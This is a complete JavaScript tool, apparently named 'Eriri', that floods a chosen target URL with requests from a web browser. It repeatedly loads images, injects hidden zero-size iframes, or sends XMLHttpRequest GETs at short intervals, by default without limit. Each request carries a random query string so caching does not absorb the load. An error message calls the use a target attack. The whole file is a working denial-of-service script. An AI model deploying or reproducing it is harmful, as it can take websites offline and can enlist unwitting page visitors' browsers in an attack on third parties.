var Eriri = function(url,limit,timeout){
  if(!url){
    throw "I need target! Or you need a twin tail attack huh?!";
  }
  this.url = url;
  this.timeout = timeout?timeout:10;
  this.limit = (typeof limit === "number")?limit:0;
  this.interval = undefined;
  this.count = 0;
  var self = this;
  this.image = function(){
    self.stop();
    self.interval = setInterval(function(){
      self.limiter();
      var pic = new Image();
      pic.src = self.getUrl();
    }, self.timeout);
  }
  this.iframe = function(){
    self.stop();
    self.interval = setInterval(function(){
      self.limiter();
      document.body.innerHTML+='<iframe src="'+self.getUrl()+'" style="border:0px;width:0px;height:0px;"></iframe>';
    }, self.timeout);
  }
  this.request = function(){
    self.stop();
    self.interval = setInterval(function(){
      self.limiter();
      var xmlHttp = new XMLHttpRequest();
      xmlHttp.open("GET",self.getUrl(),true);
      xmlHttp.send(null);
    }, self.timeout);
  }
  this.stop = function(){
    self.count = 0;
    if(self.interval){
      clearInterval(self.interval);
    }
  }
  this.limiter = function(){
    if(self.limit != 0){
      self.count++;
      if(self.count>=self.limit){
          self.stop();
      }
    }
  }
  this.getUrl = function(){
    var rand = Math.floor(Math.random() * 1000);
    var ch = String.fromCharCode(97 + rand%26);
    if(url.indexOf('?') == -1){
      return url+'?'+ch+rand+'='+(rand*2);
    }else{
      return url+'&'+ch+rand+'='+(rand*2);
    }
  }
}
